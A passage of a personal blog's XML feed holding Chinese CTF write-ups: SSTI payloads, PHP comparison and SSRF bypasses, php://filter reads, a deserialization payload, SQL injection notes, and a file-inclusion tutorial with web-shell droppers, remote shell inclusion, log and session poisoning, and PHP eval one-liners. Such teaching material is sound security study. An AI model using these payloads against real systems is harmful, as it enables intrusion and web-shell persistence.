apos;)%7D%7D 看到flag文件文件读取打开http://ssh2.evi0s.com:8080/%7B%7B[].__class__.__base__.__subclasses__()[40](&apos;/Th1s_th3_fl1l1l11llll1g&apos;).read()%7D%7D </code></pre><p>过滤了class怎么办，base64编码绕过，招新赛的payload</p><pre><code>http://132.232.92.163:6733/?name={[].__getattribute__(&apos;X19jbGFzc19f%27.decode(%27base64&apos;)).__base__.__getattribute__([].__getattribute__(&apos;X19jbGFzc19f&apos;.decode(&apos;base64&apos;)).__base__,&apos;X19zdWJjbGFzc2VzX18=&apos;.decode(&apos;base64&apos;))()[58].__init__.func_globals[&apos;linecache&apos;].__dict__.os.listdir(&quot;/home/blacsheep/&quot;)} </code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前段时间被转专业考试逼疯，鸽了一堆比赛（不鸽也不会做，菜哭）把之前的知识补一下，从cg讲的ssti开始吧。&lt;br&gt;hexo插件问题会把两个大括号里的内容按变量处理，下文用一个代替&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>hgame(php)</title>
    <link href="http://yoursite.com/2019/02/14/hgame-php/"/>
    <id>http://yoursite.com/2019/02/14/hgame-php/</id>
    <published>2019-02-14T02:07:57.000Z</published>
    <updated>2019-02-14T03:46:44.429Z</updated>
    
    <content type="html"><![CDATA[<p>杭电vidar的hgame，其中几道php的题，写一下学到的。<br><a id="more"></a></p><h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><p><img src="/2019/02/14/hgame-php/1.jpg" alt=" "></p><p>十多个php的绕过，题目挂了，用了一个师傅博客里的图片（之前忘写了，懒~）  </p><p>#####（1）<br><img src="/2019/02/14/hgame-php/2.jpg" alt=" "><br>==和!=之间不会去判断数据类型，1和2又都被强制转换为了字符型，所以不能用数组，可用0e开头的MD5值绕过  </p><h5 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h5><p><img src="/2019/02/14/hgame-php/3.jpg" alt=" "><br>===则会判断数据类型，两个必须完全相等才返回true，所以用数组绕过，不同值的数组都返回0（详细见<a href="https://blog.csdn.net/qq_19980431/article/details/83018232）" target="_blank" rel="noopener">https://blog.csdn.net/qq_19980431/article/details/83018232）</a></p><p>#####（3）<br><img src="/2019/02/14/hgame-php/4.jpg" alt=" "></p><p>php里的特性+和.会被解析为_,所以H_game写为H+game,或者是$_SERVER[‘QUERY_STRING’] 是不会自动URLDecode 的，所以我们只需要传个URL编码过的参数名即可绕过这里</p><p>#####（4）<br><img src="/2019/02/14/hgame-php/5.jpg" alt=" ">  </p><p>数组绕过</p><p>#####（5）<br><img src="/2019/02/14/hgame-php/6.jpg" alt=" "><br>这里被难住了，ssrf类型，必须是http开头，开头的提示为admin.php,本来想着可以file协议忽略前面的地址直接读取文件内容，但是http的限制没法绕过，parse_url 里的 PHP_URL_HOST 参数获取的是 最后一个@ 符号后面的域名，而 curl 使用的是第一个 @ 符号后面的域名，这样我们就可以用 http:<a href="mailto://@127.0.0.1" target="_blank" rel="noopener">//@127.0.0.1</a>:<a href="mailto:80@www.baidu.com" target="_blank" rel="noopener">80@www.baidu.com</a>/admin.php 来绕过,从而读取admin.php</p><p>#####（6）<br><img src="/2019/02/14/hgame-php/7.jpg" alt=" "><br>这里又卡住了，之前做bugku的时候对file_getcontent理解不到位，file_getcontent内容可以执行为协议，所以直接filename=php://filter/read=convert.base64-encode/resource=flag.php就可以绕过php_exits.</p><p>#####（7）<br><img src="/2019/02/14/hgame-php/8.jpg" alt=" "><br>最终payload为：str1=s878926199a&amp;str2=s155964671a&amp;str3[]=22&amp;str4[]=1&amp;H+game[]=9e10000000000%00&amp;url=http:<a href="mailto://@127.0.0.1" target="_blank" rel="noopener">//@127.0.0.1</a>:<a href="mailto:80@www.baidu.com" target="_blank" rel="noopener">80@www.baidu.com</a>/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php</p><h2 id="php-is-the-best-language"><a href="#php-is-the-best-language" class="headerlink" title="php is the best language"></a>php is the best language</h2><p><img src="/2019/02/14/hgame-php/12.png" alt=" "><br>我们需要POST的参数，door，key，gate。但这里secret是未知的，所以我们需要对door进行处理使secert的值为空，对于hash_mac函数<br>hash_hmac ( string $algo , string $data , string $key [, bool $raw_output = FALSE ] ) : string<br>参数<br>algo：<br>要使用的哈希算法名称，例如：”md5”，”sha256”，”haval160,4” 等。<br>data：<br>要进行哈希运算的消息。<br>key：<br>使用 HMAC 生成信息摘要时所使用的密钥<br>raw_output：设置为 TRUE 输出原始二进制数据， 设置为 FALSE 输出小写 16 进制字符串。</p><p>当data的数据为数组时，返回空，所以传入data[]=0,secret的值就变成了null，然后gate的值是对key进行shal256加密，密钥为空。key的值可以确定，这里又是MD5碰撞的问题，在网上找到了一篇博客，下附地址：<br><a href="https://www.k2zone.cn/?p=2019" target="_blank" rel="noopener">https://www.k2zone.cn/?p=2019</a><br>双MD5，得到key可取key=7r4lGXCH2Ksu2JNT3BYM<br>之后可求gate<br>php&gt; var_dump(hash_hmac(‘sha256’, ‘7r4lGXCH2Ksu2JNT3BYM’, NULL)) string(64) “81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d214f1 36aa84fe6”  </p><p>最终payloadgate=81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d2 14f136aa84fe6&amp;key=7r4lGXCH2Ksu2JNT3BYM&amp;door[]=1</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;杭电vidar的hgame，其中几道php的题，写一下学到的。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Python爬虫</title>
    <link href="http://yoursite.com/2019/02/07/Python%E7%88%AC%E8%99%AB/"/>
    <id>http://yoursite.com/2019/02/07/Python爬虫/</id>
    <published>2019-02-07T11:58:08.000Z</published>
    <updated>2019-02-25T08:27:36.286Z</updated>
    
    <content type="html"><![CDATA[<p>hgame的爬虫题，做到一半就卡住了，菜是原罪，整理一下关于爬虫的知识，requests库、urllib库、re库和Beautifulsoup库。<br>咕~</p><p>hgame里的baby-spider，一开始直接被反日，虚拟机关机，提醒写爬虫要加浏览器伪造，后来一直显示you are wrong，最后看了别人的脚本才发现是css上出了问题，把第十次之后的cookie打印下来再传到浏览器上可以发现爬取的题目与显示的题目无关，网页上的渲染把题目修改了，加载公式时在network里可以看到引用了一个新的字体，利用python 里的函数 str.maketrans() 可以把css渲染后的字体转换出来</p><pre><code>fuck = str.maketrans(&apos;01345679&apos;, &apos;10694357&apos;)  question = getquestion1()b = question.translate(fuck)</code></pre><p>第三步</p><pre><code>    .question-container span{display: none;}.question-container{font-family: Ariali;font-weight: bold;}.question-container:after{content:&quot;(776299203/883952569)+(547789483)*683263066-(215127140)=?&quot;;}</code></pre><p>直接爬取style.css里的 .question-container:after里的content内容</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;hgame的爬虫题，做到一半就卡住了，菜是原罪，整理一下关于爬虫的知识，requests库、urllib库、re库和Beautifulsoup库。&lt;br&gt;咕~&lt;/p&gt;
&lt;p&gt;hgame里的baby-spider，一开始直接被反日，虚拟机关机，提醒写爬虫要加浏览器伪造，后来一
      
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>MD5碰撞</title>
    <link href="http://yoursite.com/2019/01/30/MD5%E7%A2%B0%E6%92%9E/"/>
    <id>http://yoursite.com/2019/01/30/MD5碰撞/</id>
    <published>2019-01-30T07:31:27.000Z</published>
    <updated>2019-01-30T07:48:35.977Z</updated>
    
    <content type="html"><![CDATA[<h3 id="bugku-MD5碰撞"><a href="#bugku-MD5碰撞" class="headerlink" title="bugku MD5碰撞"></a>bugku MD5碰撞</h3><p>MD5碰撞的含义：让两个不同内容的字符串或者文件有相同的MD5值。<br>之前遇到了数组的MD5碰撞，现在php里存在另一个MD5碰撞的漏洞。</p><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p><h3 id="MD5算法原理"><a href="#MD5算法原理" class="headerlink" title="MD5算法原理"></a>MD5算法原理</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;bugku-MD5碰撞&quot;&gt;&lt;a href=&quot;#bugku-MD5碰撞&quot; class=&quot;headerlink&quot; title=&quot;bugku MD5碰撞&quot;&gt;&lt;/a&gt;bugku MD5碰撞&lt;/h3&gt;&lt;p&gt;MD5碰撞的含义：让两个不同内容的字符串或者文件有相同的MD5值。&lt;
      
    
    </summary>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>SQL攻击</title>
    <link href="http://yoursite.com/2019/01/27/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/01/27/SQL注入/</id>
    <published>2019-01-27T04:11:09.000Z</published>
    <updated>2019-02-14T03:52:17.981Z</updated>
    
    <content type="html"><![CDATA[<h2 id="hgame-sql"><a href="#hgame-sql" class="headerlink" title="hgame sql"></a>hgame sql</h2><p>hgame两道sql题都不算太难，有验证不过没过滤，再次响起招新被时间盲注支配的恐惧~，整理一下大致的框架，<br><a id="more"></a></p><h3 id="数字型和字符型"><a href="#数字型和字符型" class="headerlink" title="数字型和字符型"></a>数字型和字符型</h3><p>按查询的数据类型可以分为数字和字符型</p><h4 id="判断方式："><a href="#判断方式：" class="headerlink" title="判断方式："></a>判断方式：</h4><p>?id=1 and 1=1返回正确则是数字型<br>?id=1’and’1’=’2返回正确则是字符型</p><h3 id="有回显的注入-联合查询"><a href="#有回显的注入-联合查询" class="headerlink" title="有回显的注入:联合查询"></a>有回显的注入:联合查询</h3><h3 id="盲注："><a href="#盲注：" class="headerlink" title="盲注："></a>盲注：</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><h4 id="基于报错型的盲注"><a href="#基于报错型的盲注" class="headerlink" title="基于报错型的盲注"></a>基于报错型的盲注</h4><h3 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h3><h4 id="BugKu-login1"><a href="#BugKu-login1" class="headerlink" title="BugKu login1"></a>BugKu login1</h4><p>题目hint里给了是基于约束的sql攻击，搜索了一下，</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;hgame-sql&quot;&gt;&lt;a href=&quot;#hgame-sql&quot; class=&quot;headerlink&quot; title=&quot;hgame sql&quot;&gt;&lt;/a&gt;hgame sql&lt;/h2&gt;&lt;p&gt;hgame两道sql题都不算太难，有验证不过没过滤，再次响起招新被时间盲注支配的恐惧~，整理一下大致的框架，&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Bugku(2)</title>
    <link href="http://yoursite.com/2018/12/26/Bugku-2/"/>
    <id>http://yoursite.com/2018/12/26/Bugku-2/</id>
    <published>2018-12-26T15:02:56.000Z</published>
    <updated>2019-04-14T04:51:36.827Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web8-welcome-to-bugkuctf"><a href="#Web8-welcome-to-bugkuctf" class="headerlink" title="Web8/welcome to bugkuctf"></a>Web8/welcome to bugkuctf</h2><h2 id="php变量覆盖漏洞"><a href="#php变量覆盖漏洞" class="headerlink" title="php变量覆盖漏洞"></a>php变量覆盖漏洞</h2><p>&lt;?php<br>extract($_GET);<br>if (!empty($ac))<br>{<br>$f = trim(file_get_contents($fn));<br>if ($ac === $f)<br>{<br>echo “This is flag:” .” $flag”;<br>}<br>else<br>{<br>echo”sorry!”;<br>}<br>}<br>?&gt;<br><a id="more"></a></p><h3 id="先说一下php函数"><a href="#先说一下php函数" class="headerlink" title="先说一下php函数"></a>先说一下php函数</h3><h4 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract() 函数"></a>extract() 函数</h4><p>从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。<br>该函数返回成功导入到符号表中的变量数目。</p><h4 id="trim-string-charlist"><a href="#trim-string-charlist" class="headerlink" title="trim(string,charlist)"></a>trim(string,charlist)</h4><p>string    必需。规定要检查的字符串。<br>charlist<br>可选。<br>规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符：<br>“\0” - NULL<br>“\t” - 制表符<br>“\n” - 换行<br>“\x0B” - 垂直制表符<br>“\r” - 回车<br>“ “ - 空格</p><h4 id="empty-和isset"><a href="#empty-和isset" class="headerlink" title="empty()和isset()"></a>empty()和isset()</h4><p>PHP的isset()函数 一般用来检测变量是否设置 </p><p>若变量不存在则返回 FALSE<br>若变量存在且其值为NULL，也返回 FALSE<br>若变量存在且值不为NULL，则返回 TURE </p><p>PHP的empty()函数 判断值为否为空 </p><p>若变量不存在则返回 TRUE<br>若变量存在且其值为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 TURE<br>若变量存在且值不为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 FALSE   </p><p>php封装协议php://input写入fn的值与a相同即可<br>注意要用post方法，且注意是在那个php文件下执行的该操作</p><h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p>welcome to the bugkuctf中利用php封装协议读取index.php和hint.php的内容得到全部的源码，可知flag在flag.php里，但是需要绕过一步正则匹配的限制。</p><h5 id="hint-php"><a href="#hint-php" class="headerlink" title="hint.php"></a>hint.php</h5><p>&lt;?php  </p><p>class Flag{//flag.php<br>    public $file;<br>    public function __tostring(){<br>        if(isset($this-&gt;file)){<br>            echo file_get_contents($this-&gt;file);<br>            echo “<br>“;<br>        return (“good”);<br>        }<br>    }<br>}<br>?&gt;  </p><h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><p>&lt;?php<br>$txt = $_GET[“txt”];<br>$file = $_GET[“file”];<br>$password = $_GET[“password”];  </p><p>if(isset($txt)&amp;&amp;(file_get_contents($txt,’r’)===”welcome to the bugkuctf”)){<br>    echo “hello friend!<br>“;<br>    if(preg_match(“/flag/“,$file)){<br>        echo “不能现在就给你flag”;<br>        exit();<br>    }else{<br>        include($file);<br>        $password = unserialize($password);<br>        echo $password;<br>    }<br>}else{<br>    echo “you are not the number of bugku ! “;<br>}  </p><p>?&gt;  </p><!--  $user = $_GET["txt"];  $file = $_GET["file"];  $pass = $_GET["password"];  if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){      echo "hello admin!<br>";      include($file); //hint.php  }else{      echo "you are not admin ! ";  }   -->  <p>源码中可以看到如果没有匹配到flag的话就会引用file的文件，所以file=hint.php，password的值进行序列化构造，当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 <strong>sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 </strong>wakeup() 成员函数。<br>unserialize()函数变量可控所以就可以构造payload使得hint.php的全局变量file为flag.php<br>password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}最终构造的payload为?txt=php://input&amp;file=hint.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} </p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Web8-welcome-to-bugkuctf&quot;&gt;&lt;a href=&quot;#Web8-welcome-to-bugkuctf&quot; class=&quot;headerlink&quot; title=&quot;Web8/welcome to bugkuctf&quot;&gt;&lt;/a&gt;Web8/welcome to bugkuctf&lt;/h2&gt;&lt;h2 id=&quot;php变量覆盖漏洞&quot;&gt;&lt;a href=&quot;#php变量覆盖漏洞&quot; class=&quot;headerlink&quot; title=&quot;php变量覆盖漏洞&quot;&gt;&lt;/a&gt;php变量覆盖漏洞&lt;/h2&gt;&lt;p&gt;&amp;lt;?php&lt;br&gt;extract($_GET);&lt;br&gt;if (!empty($ac))&lt;br&gt;{&lt;br&gt;$f = trim(file_get_contents($fn));&lt;br&gt;if ($ac === $f)&lt;br&gt;{&lt;br&gt;echo “This is flag:” .” $flag”;&lt;br&gt;}&lt;br&gt;else&lt;br&gt;{&lt;br&gt;echo”sorry!”;&lt;br&gt;}&lt;br&gt;}&lt;br&gt;?&amp;gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Bugku</title>
    <link href="http://yoursite.com/2018/12/21/Bugku/"/>
    <id>http://yoursite.com/2018/12/21/Bugku/</id>
    <published>2018-12-21T15:29:27.000Z</published>
    <updated>2019-02-02T07:35:18.408Z</updated>
    
    <content type="html"><![CDATA[<p>Bugku补题</p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>题目不难涉及到的php函数比较多，都是现查的，记一下<br>开始备份提示，查看临时文件index.php~或者index.php.bak<br>index.php.bak中有源码<br><a id="more"></a><br><img src="/2018/12/21/Bugku/1.png" alt=" "></p><h5 id="strstr-str1-str2"><a href="#strstr-str1-str2" class="headerlink" title="strstr(str1,str2)"></a>strstr(str1,str2)</h5><p> 函数用于判断字符串str2是否是str1的子串。如果是，则该函数返回str2在str1中首次出现的地址；否则，返回NULL。<br>&lt;?php echo strstr(“Helloworld!”,”world”);?&gt;<br>输出：<br>world!</p><h5 id="SERVER-‘REQUEST-URI’"><a href="#SERVER-‘REQUEST-URI’" class="headerlink" title="$_SERVER[‘REQUEST_URI’]"></a>$_SERVER[‘REQUEST_URI’]</h5><p><a href="http://localhost(域名或者ip地址)/aaa/index.php?p=222&amp;q=333" target="_blank" rel="noopener">http://localhost(域名或者ip地址)/aaa/index.php?p=222&amp;q=333</a><br>结果：<br>$_SERVER[‘QUERY_STRING’]=”p=222&amp;q=333”;<br>$_SERVER[‘REQUEST_URI’]=”/aaa/index.php?p=222&amp;q=333”;<br>$_SERVER[‘SCRIPT_NAME’]=”/aaa/index.php”;<br>$_SERVER[‘PHP_SELF’]=”/aaa/index.php”;</p><p>由实例可知：<br>$_SERVER[“QUERY_STRING”]  获取查询 语句，实例中可知，获取的是?后面的值<br>$_SERVER[“REQUEST_URI”]   获取 <a href="http://localhost" target="_blank" rel="noopener">http://localhost</a> 后面的值，包括/<br>$_SERVER[“SCRIPT_NAME”]   获取当前脚本的路径，如：index.php<br>$  _SERVER[“PHP_SELF”]      当前正在执行脚本的文件名</p><h5 id="substr-string-start-length"><a href="#substr-string-start-length" class="headerlink" title="substr(string,start,length)"></a>substr(string,start,length)</h5><p>substr() 函数返回字符串的一部分。length不必需。<br>echo substr(“Hello world”,6);输出第六个字符之后的<br>输出：world</p><h5 id="str-replace-find-replace-string-count"><a href="#str-replace-find-replace-string-count" class="headerlink" title="str_replace(find,replace,string,count)"></a>str_replace(find,replace,string,count)</h5><p>find<br>必需。规定要查找的值。<br>replace<br>必需。规定替换 find 中的值的值。<br>string<br>必需。规定被搜索的字符串。<br>count<br>可选。一个变量，对替换数进行计数。    </p><p>echo str_replace(“world”,”John”,”Hello world!”);<br>  将world替换为John<br>输出：Hello John!<br>该函数对大小写敏感。请使用 str_ireplace() 执行对大小写不敏感的搜索。  </p><h4 id="parse-str-函数把查询字符串解析到变量中。"><a href="#parse-str-函数把查询字符串解析到变量中。" class="headerlink" title="parse_str() 函数把查询字符串解析到变量中。"></a>parse_str() 函数把查询字符串解析到变量中。</h4><p>parse_str(“name=Peter&amp;age=43”);<br>echo $name;<br>echo $age;<br>输出：Peter 43  </p><h4 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h4><p>题目代码的意思就是ip地址之后从？开始的值，然后变为第一位之后的值，删掉?。由echo语句可知变量中有key1和key2，但是$str中遇到key就替换为空，由于替换只执行一次，所以双写就可以绕过，之后MD5碰撞构造payload：<a href="http://123.206.87.240:8002/web16/?kekeyy1[]=1&amp;kekeyy2[]=2，就可以拿到flag。" target="_blank" rel="noopener">http://123.206.87.240:8002/web16/?kekeyy1[]=1&amp;kekeyy2[]=2，就可以拿到flag。</a><br>当 md5接受的数据为数组时就会返回null，两值相等。</p><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h4><p>strcmp(str1,str2)如果str1小于str2返回-1，str1=str2返回0，str1&gt;str2返回1，if(！strcmp($a,$b)),要求a与b中值相等。<br>strcmp()在比较字符串和数组的时候直接返回0<br>a[]=1&amp;b[]=1</p><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><h3 id="文件包含漏洞-基础知识选自https-blog-csdn-net-qq-41007744-article"><a href="#文件包含漏洞-基础知识选自https-blog-csdn-net-qq-41007744-article" class="headerlink" title="文件包含漏洞(基础知识选自https://blog.csdn.net/qq_41007744/article/)"></a>文件包含漏洞(基础知识选自<a href="https://blog.csdn.net/qq_41007744/article/" target="_blank" rel="noopener">https://blog.csdn.net/qq_41007744/article/</a>)</h3><h3 id="PHP包含"><a href="#PHP包含" class="headerlink" title="PHP包含"></a>PHP包含</h3><p>php中提供四个文件包含的函数，分别是include(),include_once(),require()和require_once()。  这四个都可以进行文件包含，但有区别</p><p>require找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本<br>include找不到被包含的文件时只会产生警告(E_WARNING)，脚本继续执行<br>include_once:此语句和include雷系，唯一区别就是如果该文件中的代码已经被包含，则不会再次包含<br>require_once 此语句和require类似，唯一区别就是如果该文件中的代码已经被包含。则不会再次包含</p><h4 id="1-使用PHP封装协议"><a href="#1-使用PHP封装协议" class="headerlink" title="1.使用PHP封装协议"></a>1.使用PHP封装协议</h4><h5 id="file-get-contents内部可以使用php伪协议"><a href="#file-get-contents内部可以使用php伪协议" class="headerlink" title="file_get_contents内部可以使用php伪协议"></a>file_get_contents内部可以使用php伪协议</h5><p>PHP带有很多内置的URL风格的封装协议，，这类协议与fopen(),copy(),file_exists(),filesize()等文件系统函数所提供的功能类似。</p><p>file://              访问本地文件系统<br>http://              访问HTTP(s)网址<br>php://               访问输入/输出流<br>zlib://              压缩流<br>data://              数据<br>ssh2://              Secure Shell 2<br>expect://            处理交互式的流  </p><p>glob://              查找匹配的文件路径  </p><p>使用封装协议读取PHP文件</p><p>使用PHP封装协议内置封装协议可以读取PHP文件。</p><p>(1)<a href="http://www.xxser.com/index.php?page=php://filter/read=convert.base64-encode/resource=xxxx.php" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=php://filter/read=convert.base64-encode/resource=xxxx.php</a></p><p>得到base64加密的php源码</p><p>(2)写入php文件</p><p>使用php://input执行php语句，但使用这条语句时需要注意: php://input受限于allow_url_include(on)。</p><p>构造URL: </p><p><a href="http://www.xxser.com/index.php?page=php://input" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=php://input</a>,</p><p>并且提交数据为: &lt;?php system (‘net user’);?&gt;</p><p>如果提交&lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval($_POST[‘xxser’]);?&gt;”)?&gt;将会在index.php所在目录下生成shell.php</p><h4 id="2-包含截断"><a href="#2-包含截断" class="headerlink" title="2.包含截断"></a>2.包含截断</h4><p>当文件名会被强制添加时使用%00截断，php中不会显示%00后面的内容，这种方法只适用于magic_quotes_gpc=Off时，开启时%00会被转义。</p><h4 id="3-远程包含Shell"><a href="#3-远程包含Shell" class="headerlink" title="3. 远程包含Shell"></a>3. 远程包含Shell</h4><p>如果目标主机的allow_url_fopen是激活的，就可以尝试远程包含一句话木马，如: <a href="http://www.2cto.com/echo.txt" target="_blank" rel="noopener">http://www.2cto.com/echo.txt</a></p><p>代码如下:</p><p>&lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval ($_POST[x]);?&gt;”)?&gt;<br>访问:</p><p> <a href="http://www.xxser.com/Index.php?page=http://www.2cto.com/echo.txt" target="_blank" rel="noopener">http://www.xxser.com/Index.php?page=http://www.2cto.com/echo.txt</a>,</p><p>将会在Index.php所在的目录下生成shell.php</p><h4 id="4-本地包含配合文件上传"><a href="#4-本地包含配合文件上传" class="headerlink" title="4.本地包含配合文件上传"></a>4.本地包含配合文件上传</h4><p>很多网站通常会提供文件上传的功能，比如:上传头像、文档等。假设已经上传一句话图片木马到服务器，路径为:</p><p>/uploadfile/201363.jpg</p><p>图片代码如下:</p><p>&lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval($_POST[x]);?&gt;”)?&gt;<br>访问URL: </p><p><a href="http://www.xxser.com/Index.php?page=./uploadfile/201363.jpg" target="_blank" rel="noopener">http://www.xxser.com/Index.php?page=./uploadfile/201363.jpg</a>,</p><p>包含这张图片，将会在Index.php所在的目录中生成shell.php</p><h5 id="5-包含日志文件"><a href="#5-包含日志文件" class="headerlink" title="5.包含日志文件"></a>5.包含日志文件</h5><p>Apache运行后一般默认生成两个日志文件，一个是access.log和error.log，Apache访问日志文件记录了客户端的每次请求及服务器响应的相关信息，例如，当我们请求Index.php时，Apache就会记录我们的操作，并且写到访问日志文件access.log中</p><p>当访问一个不存在的资源时，Apache日志同样会记录</p><p>这就意味着，如果网站存在本地包含漏洞，却没有可以包含的文件时，就可以去访问URL: <a href="http://www.xxser.com/" target="_blank" rel="noopener">http://www.xxser.com/</a>&lt;?php phpinfo();?&gt;.Apache会记录请求”&lt;?php phpinfo();?&gt;”</p><p>并写到accsee.log文件中，这时再去包含Apache的日志文件，就可以利用包含漏洞。</p><p>但实际是不可行的，因为在访问URL后一句话木马在日志文件里变形了</p><p>127.0.0.1 - - [04/Jun/2013:15:04:22 +0800] “GET /%3C?php%20phpinfo();)?%3E HTTP/1.1” 403 291</p><p>PHP代码中的”&lt;,&gt;,空格”都被浏览器转码了，这样就无法利用Apache包含漏洞。</p><p>但可以通过Burp绕过编码</p><p>再利用accsee去包含accsee.log，即可成功执行其中的PHP代码</p><p>在使用Apache日志文件包含时，首先需要确定Apache的日志路径，否则即使攻击者将PHP写入日志文件，也无法包含<br><img src="/2018/12/21/Bugku/2.png" alt=" "><br>常见几个路径：<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br>/var/log/access_log</p><p>原文链接：<a href="https://blog.csdn.net/qq_41007744/article/" target="_blank" rel="noopener">https://blog.csdn.net/qq_41007744/article/</a></p><h4 id="6-包含session文件"><a href="#6-包含session文件" class="headerlink" title="6.包含session文件"></a>6.包含session文件</h4><p>session中的内容可以被控制，传入恶意代码。<br>session的存储位置可以获取。<br>1.通过phpinfo的信息可以获取到session的存储位置。<br><img src="/2018/12/21/Bugku/3.png" alt=" "><br>2.通过猜测默认的session存放位置进行尝试。session 文件一般存放在 / tmp/、/var/lib/php/session/、/var/lib/php/session / 等目录下，文件名字一般以 sess_SESSIONID 来保存</p><h4 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马"></a>php一句话木马</h4><p>查看php的shell信息：&lt;?php phpinfo();exit;?&gt;<br>eval函数将接受的字符串当做代码执行：&lt;?php eval($_get[‘a’]);?&gt;<br>&lt;?php @eval($_POST[‘c’]);?&gt;  </p><h3 id="NCTF-Web题‘基本操作’复现"><a href="#NCTF-Web题‘基本操作’复现" class="headerlink" title="NCTF Web题‘基本操作’复现"></a>NCTF Web题‘基本操作’复现</h3><p>登陆界面，guest弱口令进入，通过数据库查询语句在session中写入一句话木马“select &lt;?php eval($_get[‘a’]);?&gt;”  留下查询记录。burp抓包得到sessionid为 p5skdakeoussr62f91bg2oo2cv3is54i，包含session文件，一句话木马会将获取到的GET型a变量的值存入到session中。再构造index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_p5skdakeoussr62f91bg2oo2cv3is54i&amp;a=echo%20shell_exec(%22ls%20/%22) 列出当前目录所以文件看到nctfffffffff，cat就能拿到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Bugku补题&lt;/p&gt;
&lt;h2 id=&quot;备份是个好习惯&quot;&gt;&lt;a href=&quot;#备份是个好习惯&quot; class=&quot;headerlink&quot; title=&quot;备份是个好习惯&quot;&gt;&lt;/a&gt;备份是个好习惯&lt;/h2&gt;&lt;p&gt;题目不难涉及到的php函数比较多，都是现查的，记一下&lt;br&gt;开始备份提示，查看临时文件index.php~或者index.php.bak&lt;br&gt;index.php.bak中有源码&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>xss跨站脚本攻击(1)</title>
    <link href="http://yoursite.com/2018/12/01/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-1/"/>
    <id>http://yoursite.com/2018/12/01/xss跨站脚本攻击-1/</id>
    <published>2018-12-01T00:30:46.000Z</published>
    <updated>2018-12-10T10:16:40.925Z</updated>
    
